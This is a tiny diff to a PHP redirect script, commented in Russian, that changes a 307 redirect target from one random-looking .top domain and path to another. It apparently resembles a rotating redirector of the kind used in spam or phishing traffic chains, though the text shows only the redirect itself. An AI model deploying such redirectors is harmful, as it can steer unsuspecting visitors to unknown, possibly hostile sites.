@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahypermarkdev.top/Bysnx3');
+header('Location: https://aaakrendix.top/gRS7t7');
 exit();
 ?>
